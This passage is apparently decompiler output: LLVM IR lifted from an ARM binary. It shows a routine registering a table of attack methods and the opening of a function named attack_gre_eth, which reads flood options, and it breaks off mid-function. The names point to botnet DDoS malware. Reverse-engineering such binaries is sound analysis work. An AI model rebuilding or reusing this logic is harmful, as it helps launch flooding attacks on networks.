  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_21f30.32, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.44 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_21f30.32, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.44 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.44 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_21f30.32, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.48 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_21f30.32, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.48 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.48 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_21f30.32, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_21f30.32, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_21f30.32, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.53 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.53 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_21f30.32, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.57 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_21f30.32, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.57 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.57 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21f2c.30 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_21f2d.38 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_21f2c.30, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21f2c.30 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 65535, i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
